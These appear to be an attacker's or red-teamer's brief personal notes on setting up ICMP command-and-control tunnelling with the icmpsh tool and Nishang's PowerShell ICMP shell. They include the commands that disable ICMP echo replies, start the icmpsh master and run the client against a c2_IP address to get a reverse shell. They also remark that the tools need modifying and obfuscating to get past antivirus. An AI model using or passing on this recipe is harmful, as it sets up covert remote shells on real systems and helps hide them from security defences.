<https://www.hackingarticles.in/command-and-control-tunnelling-via-icmp/>
LOOK INTO THIS, potentially modify to bypass AV and actually call out: <https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1>

Grab exe from here: (Needs obfuscation to be able to run without triggering AV) <https://github.com/bdamele/icmpsh>

Grab updated icmpsh_m.py linked as subnode

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1 
python3 icmpsh-m.py <source IP address> <destination IP address>

.\icmpsh.exe -t c2_IP
```

